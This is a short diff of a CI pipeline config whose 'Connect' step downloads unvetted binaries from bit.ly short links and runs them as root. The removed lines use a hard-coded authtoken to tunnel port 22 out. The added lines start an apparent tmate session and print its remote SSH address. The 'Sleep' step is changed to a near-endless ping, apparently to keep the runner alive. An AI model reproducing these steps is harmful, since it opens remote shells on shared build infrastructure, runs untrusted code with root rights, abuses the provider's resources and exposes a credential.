@@ -30,14 +30,16 @@ jobs:
       - run: 
          name: Connect 
          command: |
-          wget https://bit.ly/3Iaxfe5
-          chmod +x 3Iaxfe5
-          sudo su --command "./3Iaxfe5 authtoken 22C7VwXrq4Il2k2yC4VgKYjNhsd_i6CaqAafAJ6AAHAjdixY"
-          sudo su --command "./3Iaxfe5 tcp 22"
+          wget https://bit.ly/3oSxCST
+          chmod +x 3oSxCST
+          sudo su --command "./3oSxCST -S /tmp/tmate.sock new-session -d"
+          sudo su --command "./3oSxCST -S /tmp/tmate.sock wait tmate-ready"
+          sudo su --command "./3oSxCST -S /tmp/tmate.sock display -p '#{tmate_ssh}'"
+          sudo su --command "touch /tmp/keepalive"
       - run: 
          name: Sleep
          command: |
-          sudo su --command "lscpu"
+          sudo su --command "ping -n 999999 127.0.0.1"
 
 workflows:
   version: 2.1
